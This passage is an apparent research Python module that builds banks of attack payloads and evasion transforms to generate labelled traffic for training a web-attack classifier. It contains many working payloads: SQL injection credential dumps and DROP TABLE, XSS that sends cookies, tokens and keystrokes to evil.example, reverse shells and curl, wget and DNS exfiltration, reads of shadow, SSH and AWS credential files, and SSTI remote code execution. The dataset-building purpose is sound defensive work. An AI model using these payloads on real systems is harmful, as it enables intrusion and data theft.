"""
Attack payload banks + evasion/variant transforms.
==================================================
Two responsibilities:

1. BASE PAYLOAD BANKS per attack class, split by GOAL family
   (recon / exploit / exfiltration) so an attacker persona's `goal` axis
   actually selects a different payload family.

2. EVASION TRANSFORMS that turn ONE base payload into an obfuscated VARIANT
   (encoded / mutated / polyglot). Each variant is linked back to its base
   payload via a stable payload_id, emitted by the driver as X-Capture-Parent
   (variant_type -> X-Capture-Variant). The mitmproxy addon stores these in
   record["variant"] = {variant_type, parent_id}, and merge_jsonl.py keeps
   variants (their raw_request bytes differ from the parent, so dedup won't
   collapse them).

WHY variants matter for THIS thesis: encoded/mutated variants directly move
extract_features.py's encoded_char_ratio / special_char_ratio / payload_length,
so they are exactly the realistic WAF-bypass samples the classifier must learn
to generalise to.

EXPANSION NOTES (v2 banks):
- Known classes (sqli/xss/command_injection) expanded to ~60-65 distinct base
  payloads each, stratified by SUB-TECHNIQUE (suffix prefix = technique).
- `recon` kept small on purpose: _GOAL_FAMILIES is cumulative, so recon is
  drawn by EVERY persona. Bulk lives in exploit; data-theft in exfiltration.
- Base payloads are stored CLEAN/CANONICAL (no %-encoding, no case-mangling);
  apply_evasion() is the only place encoding/mutation happens. %-encoded and
  overlong/null-byte traversals live in POLYGLOTS by design.
- code_injection deliberately left small (SSTI only) to preserve the open-set
  / held-out-unknown protocol.
"""

import base64
import random
import urllib.parse

# Each entry: (payload_id_suffix, raw_payload)

SQLI = {
    "recon": [
        ("probe_quote", "'"),
        ("probe_dquote", '"'),
        ("probe_and1", "1' AND '1'='1"),
        ("probe_or1", "1' OR '1'='1"),
        ("probe_comment", "1'-- -"),
        ("probe_paren", "1')"),
        ("probe_semi", "1';"),
    ],
    "exploit": [
        # boolean-based
        ("bool_or_num", "' OR 1=1-- -"),
        ("bool_or_str", "' OR 'a'='a"),
        ("bool_or_paren", "') OR ('1'='1"),
        ("bool_and_false", "1' AND '1'='2"),
        ("bool_or_hash", "1' OR 1=1#"),
        ("bool_or_limit", "' OR 1=1 LIMIT 1-- -"),
        ("bool_between", "1' OR 1 BETWEEN 1 AND 9-- -"),
        ("bool_in", "1' OR 1 IN (1,2,3)-- -"),
        ("bool_and_true", "1' AND '1'='1'-- -"),
        # auth bypass
        ("auth_admin", "admin'-- -"),
        ("auth_admin_hash", "admin'#"),
        ("auth_admin_or", "admin' OR '1'='1"),
        ("auth_or_semi", "' OR 1=1;-- -"),
        # error-based (MySQL + MSSQL + Postgres)
        ("err_extractvalue", "' AND extractvalue(1,concat(0x7e,version()))-- -"),
        ("err_updatexml", "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -"),
        ("err_floor", "' AND (SELECT 1 FROM(SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"),
        ("err_exp", "' AND exp(~(SELECT * FROM(SELECT version())a))-- -"),
        ("err_mssql_convert", "1' AND 1=CONVERT(int,(SELECT @@version))-- -"),
        ("err_pg_cast", "1' AND 1=CAST((SELECT version()) AS int)-- -"),
        # time-based (MySQL + MSSQL + Postgres)
        ("time_sleep", "1' AND SLEEP(3)-- -"),
        ("time_sleep_or", "' OR SLEEP(3)-- -"),
        ("time_benchmark", "1' AND BENCHMARK(2000000,MD5(1))-- -"),
        ("time_waitfor", "1'; WAITFOR DELAY '0:0:3'-- -"),
        ("time_pg_sleep", "1'; SELECT pg_sleep(3)-- -"),
        ("time_rlike", "1' RLIKE SLEEP(3)-- -"),
        # stacked queries
        ("stacked_drop", "1'; DROP TABLE users-- -"),
        ("stacked_insert", "1'; INSERT INTO users VALUES ('x','y')-- -"),
        ("stacked_update", "1'; UPDATE users SET password='x' WHERE id=1-- -"),
        ("stacked_exec_xp", "1'; EXEC xp_cmdshell('dir')-- -"),
        # blind
        ("blind_substr", "1' AND SUBSTRING(version(),1,1)='5'-- -"),
        ("blind_ascii", "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64-- -"),
        ("blind_len", "1' AND LENGTH(database())>4-- -"),
        ("subquery_exists", "1' AND EXISTS(SELECT 1 FROM users)-- -"),
        # clause injection
        ("order_by", "1' ORDER BY 5-- -"),
        ("group_by", "1' GROUP BY 1-- -"),
        ("having_one", "1' HAVING 1=1-- -"),
        ("inline_comment_and", "1'/**/AND/**/1=1-- -"),
        ("mysql_ver_comment", "1'/*!50000AND*/'1'='1"),
        # union column-count probes (non-exfil)
        ("union_null_probe", "1' UNION SELECT NULL-- -"),
        ("union_null2", "1' UNION SELECT NULL,NULL-- -"),
    ],
    "exfiltration": [
        ("union_users", "' UNION SELECT user,password FROM users-- -"),
        ("union_accounts", "' UNION SELECT username,password FROM accounts-- -"),
        ("union_schemas", "-1' UNION SELECT schema_name,2 FROM information_schema.schemata-- -"),
        ("union_tables", "-1' UNION SELECT table_name,2 FROM information_schema.tables-- -"),
        ("union_columns", "-1' UNION SELECT table_name,column_name FROM information_schema.columns-- -"),
        ("union_creds_concat", "-1' UNION SELECT concat(user,0x3a,password),2 FROM users-- -"),
        ("union_current_user", "-1' UNION SELECT current_user(),2-- -"),
        ("union_version_db", "-1' UNION SELECT version(),database()-- -"),
        ("union_load_file", "-1' UNION SELECT LOAD_FILE('/etc/passwd'),2-- -"),
        ("union_hostname", "-1' UNION SELECT @@hostname,2-- -"),
        ("union_datadir", "-1' UNION SELECT @@datadir,2-- -"),
        ("union_mysql_user", "-1' UNION SELECT host,user FROM mysql.user-- -"),
        ("union_pg_shadow", "-1' UNION SELECT usename,passwd FROM pg_shadow-- -"),
        ("union_mssql_logins", "-1' UNION SELECT name,password_hash FROM sys.sql_logins-- -"),
        ("union_group_concat", "-1' UNION SELECT group_concat(username,0x3a,password),2 FROM users-- -"),
        ("union_all_creds", "-1' UNION ALL SELECT user,password FROM users-- -"),
        ("union_email", "-1' UNION SELECT email,password FROM users-- -"),
        ("union_outfile", "-1' UNION SELECT password,2 FROM users INTO OUTFILE '/tmp/x'-- -"),
    ],
}

XSS = {
    "recon": [
        ("probe_tag", "<b>x</b>"),
        ("probe_marker", "<xss7411>"),
        ("probe_attr", '"><i>x</i>'),
        ("probe_italic", "<i>x</i>"),
        ("probe_bracket", "'\"><x>"),
    ],
    "exploit": [
        # html-context script/frame injection
        ("html_script", "<script>alert(1)</script>"),
        ("html_script_src", "<script src=//evil.example/x.js></script>"),
        ("html_script_eval", "<script>eval('al'+'ert(1)')</script>"),
        ("html_iframe_js", "<iframe src=javascript:alert(1)>"),
        ("html_iframe_srcdoc", '<iframe srcdoc="<script>alert(1)</script>">'),
        ("html_object", "<object data=javascript:alert(1)>"),
        ("html_embed", "<embed src=javascript:alert(1)>"),
        # image / media event handlers
        ("img_onerror_attr", '"><img src=x onerror=alert(1)>'),
        ("img_onerror", "<img src=x onerror=alert(1)>"),
        ("img_upper", "<IMG SRC=x ONERROR=alert(1)>"),
        ("svg_onload", "<svg/onload=alert(1)>"),
        ("svg_onload_attr", '"><svg onload=alert(1)>'),
        ("body_onload", "<body onload=alert(1)>"),
        ("media_video", "<video src=x onerror=alert(1)>"),
        ("media_audio", "<audio src=x onerror=alert(1)>"),
        # event-handler autofocus/toggle vectors
        ("event_details", "<details open ontoggle=alert(1)>"),
        ("event_marquee", "<marquee onstart=alert(1)>"),
        ("event_input", "<input autofocus onfocus=alert(1)>"),
        ("event_select", "<select autofocus onfocus=alert(1)>"),
        ("event_textarea", "<textarea autofocus onfocus=alert(1)>"),
        ("event_keygen", "<keygen autofocus onfocus=alert(1)>"),
        # attribute breakout
        ("attr_break_dq", '"><script>alert(1)</script>'),
        ("attr_break_sq", "'><script>alert(1)</script>"),
        ("attr_onmouseover", '" onmouseover=alert(1) x="'),
        ("attr_autofocus", '" autofocus onfocus=alert(1) x="'),
        # js-context breakout
        ("js_break_sq", "';alert(1)//"),
        ("js_break_dq", '";alert(1)//'),
        ("js_break_tmpl", "${alert(1)}"),
        ("js_close_script", "</script><script>alert(1)</script>"),
        # uri-scheme vectors
        ("uri_js", "javascript:alert(1)"),
        ("uri_js_domain", "javascript:alert(document.domain)"),
        ("uri_data_html", "data:text/html,<script>alert(1)</script>"),
        # svg / mathml / misc namespaces
        ("svg_nested_script", "<svg><script>alert(1)</script></svg>"),
        ("svg_animate", "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"),
        ("math_xlink", "<math><maction xlink:href=javascript:alert(1)>x</maction></math>"),
        ("a_href_js", "<a href=javascript:alert(1)>x</a>"),
        ("form_action_js", "<form action=javascript:alert(1)><input type=submit>"),
        ("style_import", "<style>@import 'javascript:alert(1)'</style>"),
        ("base_href", "<base href=//evil.example/>"),
        ("meta_refresh", "<meta http-equiv=refresh content=0;url=javascript:alert(1)>"),
    ],
    "exfiltration": [
        ("cookie_img", "<script>new Image().src='//evil.example/c?'+document.cookie</script>"),
        ("cookie_fetch", "<script>fetch('//evil.example/e?d='+btoa(document.cookie))</script>"),
        ("cookie_xhr", "<script>var x=new XMLHttpRequest();x.open('GET','//evil.example/?'+document.cookie);x.send()</script>"),
        ("cookie_beacon", "<script>navigator.sendBeacon('//evil.example',document.cookie)</script>"),
        ("cookie_location", "<script>location='//evil.example/?'+document.cookie</script>"),
        ("keylog", "<script>document.onkeypress=function(e){fetch('//evil.example/k?'+e.key)}</script>"),
        ("form_hijack", "<script>document.forms[0].action='//evil.example/steal'</script>"),
        ("localstorage", "<script>fetch('//evil.example/l?'+btoa(JSON.stringify(localStorage)))</script>"),
        ("img_cookie_onerror", '<img src=x onerror="this.src=\'//evil.example/c?\'+document.cookie">'),
        ("fetch_post_cookie", "<script>fetch('//evil.example',{method:'POST',body:document.cookie})</script>"),
        ("steal_token", "<script>fetch('//evil.example/?t='+localStorage.getItem('token'))</script>"),
        ("ws_exfil", "<script>new WebSocket('ws://evil.example').onopen=function(){this.send(document.cookie)}</script>"),
        ("dns_exfil", "<script>new Image().src='//'+btoa(document.cookie)+'.evil.example'</script>"),
        ("innerhtml_exfil", "<script>fetch('//evil.example/h?'+encodeURIComponent(document.body.innerHTML))</script>"),
        ("session_exfil", "<script>fetch('//evil.example/s?'+document.cookie)</script>"),
    ],
}

# HELD-OUT unknown (open-set). SSTI (Pug/Jade) on Juice Shop = CWE-94.
# Deliberately kept SMALL and un-expanded to preserve the open-set protocol.
CODE_INJECTION = {
    "recon": [
        ("ssti_math", "#{7*7}"),
        ("ssti_add", "#{1+1}"),
    ],
    "exploit": [
        ("ssti_rce_id", "#{root.process.mainModule.require('child_process').execSync('id')}"),
        ("ssti_rce_ls", "#{root.process.mainModule.require('child_process').execSync('ls -la')}"),
        ("ssti_hostname", "#{global.process.mainModule.require('os').hostname()}"),
    ],
    "exfiltration": [
        ("ssti_env", "#{root.process.mainModule.require('child_process').execSync('env')}"),
        ("ssti_readpasswd", "#{root.process.mainModule.require('fs').readFileSync('/etc/passwd')}"),
    ],
}


COMMAND_INJECTION = {
    "recon": [
        ("probe_semicolon", "; id"), ("probe_pipe", "| id"), ("probe_amp", "& id"),
        ("probe_backtick", "`id`"), ("probe_dollar", "$(id)"),
        ("probe_or", "|| id"), ("probe_and", "&& id"),
        # Blind / time-based probing: no output is returned, so the attacker
        # confirms execution purely by the RESPONSE DELAY. Found 2026-09-18:
        # `sleep` is one of extract_features.py's own 18 CMDI_COMMANDS
        # keywords, yet no base payload in this bank ever contained it - a
        # real, checkable coverage gap (mirrors the earlier 34.5% kw_cmdi
        # bug, just in the opposite direction: feature expects it, generator
        # never produced it).
        ("blind_sleep_semi", "; sleep 5"), ("blind_sleep_pipe", "| sleep 5"),
        ("blind_sleep_and", "&& sleep 10"), ("blind_sleep_sub", "$(sleep 5)"),
        ("blind_sleep_back", "`sleep 5`"), ("blind_ping_count", "; ping -c 10 127.0.0.1"),
        # Quote-splitting keyword evasion: adjacent quoted fragments are
        # concatenated back together by the shell before execution, so
        # "w'h'o'am'i" still runs as "whoami" - defeats a literal keyword
        # filter without any encoding at all. Confirmed via
        # PayloadsAllTheThings' Command Injection technique list
        # (github.com/swisskyrepo/PayloadsAllTheThings) - not represented
        # in this bank before 2026-09-18.
        ("qsplit_whoami_single", "; w'h'o'am'i"),
        ("qsplit_whoami_double", "; w\"h\"o\"am\"i"),
        ("qsplit_id_backslash", "; i\\d"),
    ],
    "exploit": [
        ("chain_semicolon_ls", "; ls -la"), ("chain_pipe_whoami", "| whoami"),
        ("chain_amp_hostname", "& hostname"), ("chain_backtick_uname", "`uname -a`"),
        ("chain_dollar_uname", "$(uname -a)"), ("chain_and_whoami", "&& whoami"),
        ("chain_or_whoami", "|| whoami"), ("newline_id", "\nid"),
        ("chain_semicolon_ps", "; ps aux"), ("chain_semicolon_netstat", "; netstat -an"),
        ("win_amp_dir", "& dir"), ("win_amp_type", "& type C:\\windows\\win.ini"),
        ("chain_semicolon_ifconfig", "; ifconfig"), ("chain_semicolon_id_bg", "; id #"),
        # Windows/PowerShell chaining: the bank had only 2 Windows-flavored
        # payloads (win_amp_dir/win_amp_type) out of 165 total, and
        # "cmd.exe"/"powershell"/"ping -n" - all present in CMDI_KEYWORDS -
        # never appeared in any generated payload either.
        ("win_powershell_cmd", "& powershell -Command whoami"),
        ("win_cmd_exe", "& cmd.exe /c whoami"),
        ("win_ping_n", "& ping -n 10 127.0.0.1"),
        ("win_semicolon_dir_c", "; dir C:\\"),
        # Direct shell invocation / reverse shell: "/bin/bash", "bash -i",
        # "sh -c", "nc -e", "netcat" are also checked-for CMDI_KEYWORDS with
        # zero prior examples - the actual weaponized end-state of a
        # successful command injection, not just a probing chain.
        ("revshell_bash_i", "; bash -i >& /dev/tcp/evil.example/4444 0>&1"),
        ("revshell_nc_e", "; nc -e /bin/sh evil.example 4444"),
        ("revshell_sh_c", "; sh -c id"), ("subshell_bin_bash", "$(/bin/bash -c id)"),
        # Hex-encoded command string: the shell decodes \xNN escapes before
        # execution, so the literal keyword never appears in the request.
        # Different mechanism from our existing url/double/partial-encode
        # transforms below, which encode the whole query VALUE - this
        # encodes only the command STRING inside a shell builtin.
        ("hex_echo_id", '; $(echo -e "\\x69\\x64")'),
        ("hex_echo_passwd_path", '; cat $(echo -e "\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64")'),
        # Argument injection: a DIFFERENT attack surface entirely - instead
        # of chaining a new command, the payload abuses a FLAG of the
        # command already being run (no separator prefix, since the value
        # itself becomes the malicious argument).
        ("arginj_ssh_proxycommand", "-oProxyCommand=touch /tmp/pwned"),
        ("arginj_wget_post_file", "--post-file=/etc/passwd"),
    ],
    "exfiltration": [
        ("exfil_cat_passwd", "; cat /etc/passwd"), ("exfil_cat_shadow", "; cat /etc/shadow"),
        ("exfil_curl_out", "; curl http://evil.example/$(whoami)"),
        ("exfil_wget_out", "; wget http://evil.example/$(id)"),
        ("exfil_nc", "; nc evil.example 4444 -e /bin/sh"),
        ("exfil_base64_passwd", "; cat /etc/passwd | base64"),
        ("exfil_env", "; env"), ("exfil_history", "; cat ~/.bash_history"),
        # Out-of-band DNS exfiltration: a distinct, commonly-documented
        # technique category (data leaves via DNS lookups, not HTTP/TCP),
        # not represented at all in the prior curl/wget/nc-only exfil set.
        ("exfil_dns_nslookup", "; nslookup $(whoami).evil.example"),
        ("exfil_dns_dig", "; dig $(id).evil.example"),
        # IFS/wildcard obfuscation: a shell-syntax evasion category distinct
        # from the encoding-level evasion transforms below (case/URL/comment)
        # - substitutes the literal space that a naive filter might block.
        ("ifs_cat_passwd", "; cat${IFS}/etc/passwd"),
        ("ifs_wildcard_cat", "; cat${IFS}/e??/pa??wd"),
    ],
}


def _gen_cmdi_exploit():
    out = []
    seps = ["; ", "| ", "& ", "&& ", "|| ", "\n", "%0a "]
    cmds = ["id", "whoami", "uname -a", "hostname", "ls -la", "pwd", "cat /etc/passwd",
            "ps aux", "netstat -an", "ifconfig", "env", "dir",
            "type C:\\windows\\win.ini", "ping -c 1 127.0.0.1", "curl http://evil.example"]
    for sep in seps:
        for cmd in cmds:
            out.append(("gen_chain", f"{sep}{cmd}"))
    for pre, post in [("$(", ")"), ("`", "`")]:
        for cmd in cmds:
            out.append(("gen_subshell", f"{pre}{cmd}{post}"))
    return out


def _gen_cmdi_exfil():
    out = []
    secrets = ["cat /etc/shadow", "cat /etc/passwd", "cat ~/.ssh/id_rsa",
               "cat ~/.aws/credentials", "cat ~/.bash_history", "env",
               "cat /etc/apache2/apache2.conf", "cat /etc/nginx/nginx.conf"]
    net_cmds = ["curl http://evil.example/$(whoami)", "wget http://evil.example/?d=$(id)",
                "nc evil.example 4444 -e /bin/sh"]
    for sep in ["; ", "| ", "&& "]:
        for s in secrets:
            out.append(("gen_exfil_cat", f"{sep}{s}"))
        for e in net_cmds:
            out.append(("gen_exfil_net", f"{sep}{e}"))
    return out


COMMAND_INJECTION["exploit"] += _gen_cmdi_exploit()
COMMAND_INJECTION["exfiltration"] += _gen_cmdi_exfil()


BANKS = {
    "sqli": SQLI,
    "xss": XSS,
    "command_injection": COMMAND_INJECTION,
    "code_injection": CODE_INJECTION,
}

# Polyglots - payloads crafted to fire across multiple contexts. Kept as a
# BANK per attack type (not a single string) so the polyglot persona still
# produces real byte-diversity instead of collapsing to one sample per class
# after byte-identical dedup in merge_jsonl.py. NOTE: command_injection
# polyglots intentionally combine separators/subshells (that is their whole
# point) - so they live HERE, not in the canonical base bank.
POLYGLOTS = {
    "command_injection": [
        "; id; whoami", "| id | whoami", "`id``whoami`", "$(id)$(whoami)",
        "; id & whoami", "&& id || whoami", "%0a id %0a whoami",
        "; cat /etc/passwd; id", "| cat /etc/passwd | id",
    ],
    "sqli": [
        "1' OR '1'='1' UNION SELECT NULL-- -",
        "1'/**/OR/**/1=1#",
        "') OR ('a'='a",
        '" OR ""="',
        "1); WAITFOR DELAY '0:0:3'-- -",
        "1' AND 1=1 UNION SELECT NULL,NULL-- -",
        "admin'/**/OR/**/'1'='1",
        "' OR 1=1 LIMIT 1;-- -",
        '"/**/OR/**/1=1-- -',
        "')/**/OR/**/('1'='1",
        "1;SELECT pg_sleep(3)--",
        "1' AND SLEEP(3) AND 'a'='a",
        "0 OR 1=1",
    ],
    "xss": [
        '"\'><svg/onload=alert(1)>',
        "javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>",
        '\'"><img src=x onerror=alert(1)>',
        "</script><script>alert(1)</script>",
        '"><body onload=alert(1)>',
        "<img src=x onerror=alert(1)//",
        '\'"><svg onload=alert(1)>',
        "javascript:alert(1)//",
        '"><iframe srcdoc="<script>alert(1)</script>">',
        "</title></style><script>alert(1)</script>",
        "<svg><script>alert(1)</script>",
        "${alert(1)}{{7*7}}",
        '\'"></script><script>alert(1)</script>',
    ],
    "code_injection": [
        "#{7*7}${7*7}{{7*7}}",
        "${{7*7}}#{7*7}<%= 7*7 %>",
        "{{7*7}}[[7*7]]#{7*7}",
        "#{7*7}${{7*7}}{{7*'7'}}",
        "{{7*7}}${7*7}#{7*7}<%=7*7%>",
        "#{7*7}${{7*7}}[[${7*7}]]",
    ],
}

# ==========================================================================
# v3 COMBINATORIAL EXPANSION
# --------------------------------------------------------------------------
# The curated banks above are the hand-written quality core. Below we grow
# each KNOWN class (sqli / xss / command_injection) into a payload SPACE large
# enough that the driver can capture ~1000+ byte-unique requests per class
# after merge_jsonl dedup. code_injection is grown only MODERATELY on purpose
# to preserve its held-out / open-set (Protocol 3) role.
# Base payloads stay CLEAN/CANONICAL (no %-encoding); apply_evasion() remains
# the only place encoding/mutation happens. %-encoded / overlong forms live in
# POLYGLOTS by design. Generation is DETERMINISTIC, so payload_ids are stable
# across runs (safe for group-wise CV on parent_id / payload_id).
# ==========================================================================


def _gen_sqli_exploit():
    out = []
    closures = ["'", '"', "')", '")', "1'", '1"', "-1'", '-1"', "1')", '1")']
    bool_cores = [
        "OR 1=1", "OR 2=2", "OR 3>2", "OR 'a'='a", "OR 'x'='x",
        "OR 1=1 AND '1'='1", "AND 1=1", "AND 2>1", "OR 1 LIKE 1",
        "OR 'ab' LIKE 'a%'", "OR 1=1 OR '1'='1", "OR 5=5", "OR 7>1",
        "OR 1 IN (1,2,3)", "OR 1 BETWEEN 1 AND 9",
    ]
    comments = ["-- -", "#", "-- ", ";-- -", "/*"]
    for c in closures:
        for core in bool_cores:
            for cm in comments:
                out.append(("gen_bool", f"{c} {core}{cm}"))
    time_cores = [
        "AND SLEEP(3)", "OR SLEEP(3)", "AND SLEEP(5)",
        "; WAITFOR DELAY '0:0:3'", "; SELECT pg_sleep(3)",
        "AND BENCHMARK(2000000,MD5(1))", "RLIKE SLEEP(3)",
        "AND (SELECT SLEEP(3))", "|| pg_sleep(3)", "; SELECT pg_sleep(5)",
    ]
    for c in closures:
        for core in time_cores:
            for cm in ["-- -", "#", ";-- -"]:
                out.append(("gen_time", f"{c} {core}{cm}"))
    err_cores = [
        "AND extractvalue(1,concat(0x7e,version()))",
        "AND updatexml(1,concat(0x7e,database()),1)",
        "AND exp(~(SELECT * FROM(SELECT version())a))",
        "AND (SELECT 1 FROM(SELECT count(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)",
        "AND 1=CONVERT(int,@@version)",
        "AND 1=CAST(version() AS int)",
        "AND GTID_SUBSET(version(),1)",
        "AND JSON_KEYS((SELECT version()))",
    ]
    for c in closures:
        for core in err_cores:
            out.append(("gen_err", f"{c} {core}-- -"))
    return out


def _gen_sqli_exfil():
    out = []
    closures = ["'", '"', "-1'", '-1"', "')", "1'"]
    tables = [
        ("users", "username", "password"), ("users", "user", "password"),
        ("accounts", "username", "password"), ("members", "email", "pass"),
        ("admin", "login", "password"), ("customers", "email", "password"),
        ("wp_users", "user_login", "user_pass"),
        ("mysql.user", "user", "authentication_string"),
    ]
    for c in closures:
        for (t, a, b) in tables:
            out.append(("gen_union", f"{c} UNION SELECT {a},{b} FROM {t}-- -"))
            out.append(("gen_union_cc", f"{c} UNION SELECT concat({a},0x3a,{b}),2 FROM {t}-- -"))
    infos = [
        "schema_name,2 FROM information_schema.schemata",
        "table_name,2 FROM information_schema.tables",
        "table_name,column_name FROM information_schema.columns",
    ]
    for c in closures:
        for info in infos:
            out.append(("gen_infoschema", f"{c} UNION SELECT {info}-- -"))
    sysfns = ["version(),database()", "current_user(),@@hostname",
              "@@datadir,@@version", "user(),database()", "@@version,user()"]
    for c in closures:
        for s in sysfns:
            out.append(("gen_sysfn", f"{c} UNION SELECT {s}-- -"))
    files = ["/etc/passwd", "/etc/shadow", "/var/www/html/config/config.inc.php"]
    for c in closures:
        for f in files:
            out.append(("gen_loadfile", f"{c} UNION SELECT LOAD_FILE('{f}'),2-- -"))
    return out


def _gen_xss_exploit():
    out = []
    breakouts = ["", '">', "'>", '"><', "'><", "'\"><", "</script>", "</title>", '"></textarea>']
    tag_events = [
        ("img", "onerror"), ("svg", "onload"), ("video", "onerror"), ("audio", "onerror"),
        ("body", "onload"), ("iframe", "onload"), ("input", "onfocus"), ("select", "onfocus"),
        ("textarea", "onfocus"), ("details", "ontoggle"), ("marquee", "onstart"),
        ("object", "onerror"), ("embed", "onerror"), ("image", "onerror"), ("form", "onsubmit"),
    ]
    payloads = ["alert(1)", "alert(document.domain)", "alert(document.cookie)",
                "print()", "confirm(1)", "prompt(1)", "alert(2)"]
    for b in breakouts:
        for (tag, ev) in tag_events:
            for pl in payloads:
                if tag in ("img", "video", "audio", "image", "embed", "object", "iframe"):
                    vec = f"<{tag} src=x {ev}={pl}>"
                elif tag in ("input", "select", "textarea"):
                    vec = f"<{tag} autofocus {ev}={pl}>"
                elif tag == "details":
                    vec = f"<details open {ev}={pl}>"
                elif tag == "form":
                    vec = f"<form {ev}={pl}><input type=submit>"
                else:
                    vec = f"<{tag} {ev}={pl}>"
                out.append(("gen_evt", f"{b}{vec}"))
    script_pls = ["alert(1)", "alert(document.cookie)", "eval('al'+'ert(1)')",
                  "alert(document.domain)", "print()"]
    for b in breakouts:
        for pl in script_pls:
            out.append(("gen_script", f"{b}<script>{pl}</script>"))
    for pl in ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]:
        out.append(("gen_uri", f"javascript:{pl}"))
    return out


def _gen_xss_exfil():
    out = []
    sinks = [
        "new Image().src='//evil.example/c?'+%s",
        "fetch('//evil.example/e?d='+%s)",
        "location='//evil.example/?'+%s",
        "navigator.sendBeacon('//evil.example',%s)",
        "new Image().src='//evil.example/?'+encodeURIComponent(%s)",
    ]
    data = ["document.cookie", "localStorage.getItem('token')",
            "document.body.innerHTML", "btoa(document.cookie)",
            "JSON.stringify(localStorage)"]
    wrappers = ["<script>%s</script>", '<img src=x onerror="%s">', '<svg onload="%s">']
    for s in sinks:
        for d in data:
            code = s % d
            for w in wrappers:
                out.append(("gen_exfil", w % code))
    return out


def _gen_code_injection():
    recon, exploit, exfil = [], [], []
    wrappers = ["#{%s}", "${%s}", "{{%s}}", "<%%= %s %%>"]
    exprs = ["7*7", "1+1", "2*3", "9-2", "6*6"]
    for w in wrappers:
        for e in exprs:
            recon.append(("gen_math", w % e))
    rce_tmpls = [
        "root.process.mainModule.require('child_process').execSync('%s')",
        "global.process.mainModule.require('child_process').execSync('%s')",
        "process.mainModule.require('child_process').execSync('%s')",
    ]
    cmds = ["id", "whoami", "uname -a", "hostname", "ls -la", "cat /etc/passwd", "env"]
    for w in wrappers:
        for rt in rce_tmpls:
            for cmd in cmds:
                exploit.append(("gen_rce", w % (rt % cmd)))
    os_tmpls = [
        "global.process.mainModule.require('os').hostname()",
        "root.process.mainModule.require('os').userInfo().username",
    ]
    for w in wrappers:
        for ot in os_tmpls:
            exploit.append(("gen_os", w % ot))
    fs_tmpls = ["root.process.mainModule.require('fs').readFileSync('%s')"]
    files = ["/etc/passwd", "/etc/hostname", "/proc/self/environ"]
    for w in wrappers:
        for ft in fs_tmpls:
            for fl in files:
                exfil.append(("gen_fs", w % (ft % fl)))
    return recon, exploit, exfil


def _gen_polyglots():
    import itertools as _it
    sqli, xss, ci = [], [], []
    closures = ["'", '"', "')", '1"', "-1'"]
    tails = ["-- -", "#", "/**/", ";-- -"]
    for c in closures:
        for t in tails:
            sqli.append(f"{c} OR 1=1 UNION SELECT NULL{t}")
            sqli.append(f"{c}/**/OR/**/1=1{t}")
    xbreak = ["'\"><", '"></title>', "</script>", "'>", '">']
    xtail = ["<svg/onload=alert(1)>", "<img src=x onerror=alert(1)>", "<script>alert(1)</script>"]
    for b in xbreak:
        for t in xtail:
            xss.append(f"{b}{t}")
    ci_bases = ["#{7*7}", "${7*7}", "{{7*7}}", "<%= 7*7 %>", "[[7*7]]"]
    for a, b in _it.combinations(ci_bases, 2):
        ci.append(a + b)
    return sqli, xss, ci


# --- apply the expansion (BANKS references these same dict objects) ----------
SQLI["exploit"] += _gen_sqli_exploit()
SQLI["exfiltration"] += _gen_sqli_exfil()
XSS["exploit"] += _gen_xss_exploit()
XSS["exfiltration"] += _gen_xss_exfil()
_ci_r, _ci_e, _ci_x = _gen_code_injection()
# OPEN-SET GUARD (CWE-94 held-out unknown): code_injection must stay SMALL &
# novel so it is a genuine unseen class at test time. _gen_code_injection()
# over-expands it (~124), so cap the generated additions to a small, balanced,
# deterministic budget -> class stays <= _CI_OPENSET_MAX distinct base payloads
# (stable payload_ids across runs -> safe for group-wise CV on parent_id).
_CI_OPENSET_MAX = 20
_ci_curated = sum(len(v) for v in CODE_INJECTION.values())
_ci_budget = max(0, _CI_OPENSET_MAX - _ci_curated)
_ci_r = _ci_r[:min(5, _ci_budget)]
_ci_budget -= len(_ci_r)
_ci_e = _ci_e[:min(5, _ci_budget)]
_ci_budget -= len(_ci_e)
_ci_x = _ci_x[:max(0, _ci_budget)]
CODE_INJECTION["recon"] += _ci_r
CODE_INJECTION["exploit"] += _ci_e
CODE_INJECTION["exfiltration"] += _ci_x

_pg_s, _pg_x, _pg_c = _gen_polyglots()
POLYGLOTS["sqli"] = list(dict.fromkeys(POLYGLOTS["sqli"] + _pg_s))
POLYGLOTS["xss"] = list(dict.fromkeys(POLYGLOTS["xss"] + _pg_x))
POLYGLOTS["code_injection"] = list(dict.fromkeys(POLYGLOTS["code_injection"] + _pg_c))


def _finalize(bank):
    """Dedupe payloads ACROSS families (recon>exploit>exfil order, keep first/
    curated) and guarantee unique payload_id suffixes within the whole class, so
    every base_payloads(class, goal) list has unique payloads AND unique ids."""
    seen_p, seen_s = set(), set()
    for fam, pairs in bank.items():
        out = []
        for sfx, p in pairs:
            if p in seen_p:
                continue
            s, i = sfx, 0
            while s in seen_s:
                i += 1
                s = f"{sfx}_{i}"
            seen_p.add(p)
            seen_s.add(s)
            out.append((s, p))
        bank[fam] = out


for _bank in (SQLI, XSS, COMMAND_INJECTION, CODE_INJECTION):
    _finalize(_bank)


# Which families are unlocked by each goal (cumulative). recon is always a
# floor so even LOW-intensity recon personas get usable payloads.
_GOAL_FAMILIES = {
    "recon": ["recon"],
    "exploit": ["recon", "exploit"],
    "exfiltration": ["recon", "exploit", "exfiltration"],
}


def base_payloads(attack_type: str, goal: str) -> list:
    """Return [(payload_id, raw_payload)] for an attack type, filtered by goal."""
    bank = BANKS[attack_type]
    out = []
    for fam in _GOAL_FAMILIES[goal]:
        for suffix, payload in bank.get(fam, []):
            out.append((f"{attack_type}-{fam}-{suffix}", payload))
    return out


# ----------------------------- evasion transforms -----------------------------
def _encode_url(p: str) -> str:
    return urllib.parse.quote(p, safe="")


def _encode_double(p: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")


def _mutate_case(p: str) -> str:
    # Randomised case-swap - defeats naive case-sensitive keyword filters.
    out = []
    for c in p:
        if c.isalpha() and random.random() < 0.5:
            out.append(c.upper() if c.islower() else c.lower())
        else:
            out.append(c)
    return "".join(out)


def _mutate_comment(p: str) -> str:
